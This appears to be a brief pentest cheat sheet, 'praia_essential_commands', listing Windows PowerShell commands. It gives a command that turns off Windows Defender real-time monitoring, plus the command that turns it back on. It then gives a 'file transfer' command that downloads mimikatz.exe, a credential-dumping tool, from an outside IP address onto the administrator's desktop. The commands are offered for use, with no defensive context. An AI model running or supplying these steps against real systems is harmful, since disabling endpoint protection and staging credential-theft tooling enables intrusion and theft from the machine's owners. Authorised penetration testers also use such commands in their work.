# praia_essential_commands
Command for pentest

# disable Windows Defender on Windows 10 using PowerShell
#### Fire up a PowerShell window as administrator and run the following command:

PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true

#### Just set the DisableRealTimeMonitoring back to false to re-enable the real-time monitoring within Defender.

PS C:\> Set-MpPreference -DisableRealtimeMonitoring $false


# File transfer

PS C:\>  powershell.exe wget http://10.10.12.39/mimikatz.exe -outfile C:\users\administrator\desktop\mimikatz.exe
